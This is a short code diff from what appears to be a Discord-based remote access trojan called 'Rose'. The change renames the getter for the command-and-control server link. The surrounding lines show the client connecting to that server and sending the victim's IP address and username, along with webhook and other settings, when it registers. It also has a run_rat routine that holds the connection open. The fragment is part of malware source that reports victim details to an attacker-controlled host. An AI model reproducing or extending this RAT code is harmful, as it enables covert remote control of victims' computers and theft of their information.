@@ -178,7 +178,7 @@ class CommandHandler():
                             }})
                             time.sleep(0.5) #Don't overload the server
                             
-            _sio.connect(cc.get_discord_rat_link())
+            _sio.connect(cc.get_rose_discord_rat_link())
             
         t = threading.Thread(target=to_execute, args=(self,))
         t.run()
@@ -192,7 +192,7 @@ def connect():
     sio.emit('rose_connect', {'data': {
         'ip': ii.get_ip(),
         'username': ii.get_username(),
-        'server': cc.get_discord_rat_link(),
+        'server': cc.get_rose_discord_rat_link(),
         'webhook': cc.get_webhook(),
         'avatar': cc.get_avatar(),
         'footer': cc.get_footer(),
@@ -237,5 +237,5 @@ def disconnect():
     print("disconnect")
 
 def run_rat():
-    sio.connect(cc.get_discord_rat_link())
+    sio.connect(cc.get_rose_discord_rat_link())
     sio.wait()
